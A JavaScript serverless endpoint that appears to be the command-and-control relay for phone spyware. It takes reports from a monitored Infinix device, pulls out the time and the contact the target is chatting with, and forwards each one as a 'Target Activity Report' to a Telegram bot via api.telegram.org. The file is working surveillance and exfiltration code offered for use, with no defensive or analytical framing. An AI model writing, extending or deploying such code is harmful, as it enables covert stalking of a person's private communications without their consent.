export default async function handler(request, response) {
    if (request.method !== 'POST') {
        return response.status(405).json({ error: 'Method Not Allowed' });
    }

    const { accessKey, ...data } = request.body;
    const expectedApiKey = process.env.MY_SECRET_API_KEY;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!expectedApiKey || !botToken || !chatId) {
        return response.status(500).json({ error: 'Server configuration fucked up' });
    }

    if (accessKey !== expectedApiKey) {
        return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
    }

    if (!data.message) {
        return response.status(400).json({ error: 'Message field missing' });
    }

    try {
        const rawMessage = data.message;
        
        const device = (rawMessage.match(/\*\*(INFINIX.*?)\*\*/) || [])[1] || 'N/A';
        const time = (rawMessage.match(/\*\*Time:\*\* ([\d:]+)/) || [])[1] || 'N/A';
        const event = (rawMessage.match(/\*\*CHAT SWITCHED\*\*/) || ["Unknown Event"])[0].replace(/\*\*/g, '');
        const number = (rawMessage.match(/\*\*Now Chatting With:\*\* (.*?)$/s) || [])[1] || 'N/A';

        let formattedMessage = `*🚨 Target Activity Report 🚨*

*📱 Device:* \`${device.trim()}\`
*🕒 Time:* \`${time.trim()}\`
*⚡ Event:* \`${event.trim()}\`
*👤 Target Chat:* \`${number.trim()}\`
        `;

        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: formattedMessage,
                parse_mode: 'Markdown',
            }),
        });
        
        return response.status(200).json({ status: 'ok' });
    } catch (error) {
        return response.status(500).json({ error: 'Failed to parse and forward data' });
    }
}
